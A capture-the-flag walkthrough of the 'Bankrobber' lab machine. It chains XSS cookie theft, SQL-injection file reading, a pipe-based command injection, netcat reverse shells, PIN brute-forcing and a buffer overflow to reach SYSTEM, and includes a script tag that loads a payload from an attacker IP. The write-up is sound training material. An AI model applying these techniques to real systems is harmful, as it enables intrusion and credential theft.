# Bankrobber

*Converted from: Bankrobber.pdf*

---

# Bankrobber

19 [th] February 2020 / Document No D20.100.59


Prepared By: MinatoTW


Machine Author(s): Gioo & Cneeliz


Difficulty: Insane


Classification: Official


## **Synopsis**

Bankrobber is an Insane difficulty Windows machine featuring a web server that is vulnerable to

XSS. This is exploited to steal the administrator's cookies, which are used to gain access to the

admin panel. The panel is found to contain additional functionality, which can be exploited to

read files as well as execute code and gain foothold. An unknown service running on the box is

found to be vulnerable to a buffer overflow, which can be exploited to execute arbitrary

commands as SYSTEM.
### **Skills Required**


Enumeration

JavaScript XSS Payloads

SQL Injection
### **Skills Learned**


Command Injection

File read through SQLi

Buffer Overflow


## **Enumeration**

### **Nmap**



Nmap output identifies that this is a Windows box running SMB, HTTP and HTTPS on their default

ports. Additionally, a MySQL server is exposed.
### **HTTP**


Browsing to port 80, a cryptocurrency related website is found.


The registration form is used to create a new account and then login.


Upon logging in, we see a form for transferring e-coin to any address. Completing the form and

submitting results in the following message.


This indicates that an admin might be reviewing the transactions before approving them.

Intercept the request in burp to look at the parameters.

The username and password are found to be base64 encoded cookies. The fromId parameter is

set to 3, which indicates that user ids 1 and 2 must already exist. The toId value should be set to

something valid in order for a transaction to take place. Let's check if the form is vulnerable to

XSS by adding an img tag in the comment section.




URL encode the XSS payload and change the toId value to 1. Forward the request and start a

listener on port 80. We should receive a GET request if the server is vulnerable to XSS.


A GET request is received, which proves that the server is vulnerable as well as confirming the

administrator's activity.
### **Exploiting XSS**


We already know that the username and password are saved as cookies. It's possible to access

them from JavaScript and steal them, as they aren't protected by the HttpOnly attribute. The

onerror attribute in the img tag can be used to achieve this.


The image load will fail due an invalid src, after which the onerror attribute is triggered. This

attribute has access to document.cookie through JavaScript and is used to set the src to our IP

address. The btoa() function is used to encode the cookies as base64 and then append it to the

IP address. URL encode this payload and repeat the request.


As expected, the cookies are received encoded as base64. This value can be decoded to gain the

credentials.

The username is admin and the password is revealed to be Hopelessromantic . Let's use these

credentials to login as the administrator.

The admin page is found to have two extra functionalities. The Search Users function lets the

admin user search for users based on user id, while the Backdoorchecker allows execution of

the dir command. Trying to run dir returns the following error.


Additionally, there's a file named notes.txt hosted on the server.

Let's save this for later reference. Entering the userId as 1 in the search box returns admin .


Injecting a quote with the input returns an error.


This probably means that the server is vulnerable to SQL injection. Intercept the request in Burp

for further inspection. Let's try finding the number of columns in the table using the ORDER BY

clause.





URL encode the payload above and forward the request.


The usual success response is returned by the server. Incrementing the columns to 4 returns an

error.

This means that the table contains 3 columns. We can leverage this to perform a UNION based

SQL injection. Let's find the current user and the database.





We're found to be running as the root user with the highest privileges.

The current database name is found to be bankrobber . A list of all databases can be obtained by

using the INFORMATION_SCHEMA.SCHEMATA table.




The only non-default database is found to be bankrobber, i.e. the current database. Let's look at

the tables in this database.


The database is found to contain the tables balance, hold and users. There's nothing interesting

in these, as we already have the administrator's credentials.
### **File Read through SQL injection**


The MySQL [LOAD_FILE() function can be used to read files on the server. Let's try reading a](https://dev.mysql.com/doc/refman/8.0/en/string-functions.html#function_load-file)

default Windows file such as C:/Windows/win.ini .





The file read was successful and the server returned the contents. From the notes.txt file

earlier, we know that the server files are present in the default XAMP folders. The default web

root in XAMPP is set to C:\XAMPP\htdocs . Let's try reading the backdoorchecker.php file in the

admin folder.




This returns the following source code.



The script decodes the username and password cookies, and verifies that the session belongs to

the admin. The allowed command is set to dir and the character & is blacklisted, which

prevents us from injecting commands. However, the pipe character | can be used to execute

additional system commands as well. The script then checks if the commands are sent from

localhost. This can be bypassed by sending requests through the XSS.


## **Foothold**

The following JavaScript code will send a POST request to the page.



An [XMLHttpRequest](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest) object is created and the URL is set to backdoorchecker.php . The |

character separates the dir command from the ping command, and the cmd parameter is set

to this value. The xhr.withCredentials property is set to true, which will automatically add the

cookies to the request. This script can be included with the script tag.


<script src=http://10.10.14.3/script.js></script>


Start a web server on port 80 and a tcpdump ICMP listener. Send the request with the script tag

as follows:


A HTTP request should be received on port 80, followed by ICMP requests on the tcpdump

listener.


Now that we have code execution, we can execute a reverse shell using nc.exe. Copy nc.exe to the

current folder and start an SMB server using smbserver.py .


This binary can be executed directly from the share. Update script.js as follows:


The command will execute the netcat binary and send a reverse shell to port 443 on our box.

Send the XXS payload and start a listener on port 443.


A shell as the user cortin should be received in a short while.


## **Privilege Escalation**

Looking at the ports listening locally, we see an uncommon port 910 to be open.


We'll have to forward this port in order to access it, because the firewall blocks direct connections

to it. This can be achieved by using [chisel. Download the Windows and Linux binaries from the](https://github.com/jpillora/chisel)

releases section.


Next, start a server locally in reverse mode, so that we can forward local ports to remote.


The command above will start a listener on port 5555 locally. Next, execute the following

command on the box to create a tunnel to port 910.


This command will connect to our server and then create a tunnel from port 910 on our host to

port 910 on the box. Let's try connecting to this port now.


The service asks for a 4 digit PIN code. Entering an invalid code leads to an immediate

disconnection. As there are only 10000 possible combinations, we can bruteforce this service

using pwntools.



The script above will generate codes starting from 0000 up to 9999 . Each code is sent to the

server and the response is checked for the Access denied message.

The valid code is revealed as 0021 . Let's try connecting and entering this code.


This time, we're granted access to the service. It asks us for an amount of e-coins to transfer.

Entering some amount leads to the execution of the C:\Users\admin\Documents\transfer.exe

binary. Let's check if the server is vulnerable to a buffer overflow attack by sending a long string.


After entering a long string of As, we find that the value of the buffer was overwritten. This means

that we can overflow and control this buffer. The server will try to execute anything we place in

that buffer. Let's try adding an nc reverse shell command in it. Before that, we'll have to find the

offset at which the buffer is overwritten.

Create a pattern of 100 characters using msf-pattern_create .


And then submit this to the service.


The binary path was overwritten by 0Ab1, the offset can be found by using msf-pattern_offset .


The offset is found to be 32, which means everything after 32 characters will be written to the

binary path. Create a string of 32 A's and append the following command to it.





Copy nc.exe to the Public folder and then send the crafted input to the service.


The command gets executed and a shell as SYSTEM should be received on port 4444.


